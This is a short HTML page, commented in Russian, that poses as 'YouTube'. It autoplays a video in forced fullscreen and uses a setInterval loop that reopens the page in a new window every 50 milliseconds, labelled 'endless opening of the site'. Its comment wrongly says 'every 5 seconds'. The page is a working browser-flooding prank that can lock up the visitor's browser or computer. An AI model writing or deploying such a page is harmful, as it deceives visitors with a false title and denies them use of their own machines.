<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" />
    <title>YouTube</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <video id="video" autoplay muted playsinline>
        <source src="vid.mp4" type="video/mp4">
        Ваш браузер не поддерживает видео.
    </video>
    <script>
        const video = document.getElementById('video');

        function openFullscreen() {
            if (video.requestFullscreen) {
                video.requestFullscreen();
            } else if (video.mozRequestFullScreen) { // Firefox
                video.mozRequestFullScreen();
            } else if (video.webkitRequestFullscreen) { // Chrome, Safari and Opera
                video.webkitRequestFullscreen();
            } else if (video.msRequestFullscreen) { // IE/Edge
                video.msRequestFullscreen();
            }
        }

        video.addEventListener('canplaythrough', function () {
            openFullscreen();
        });

        // Бесконечное открытие сайта
        setInterval(() => {
            window.open(window.location.href, '_blank');
        }, 50); // каждые 5 секунд
    </script>
</body>
</html>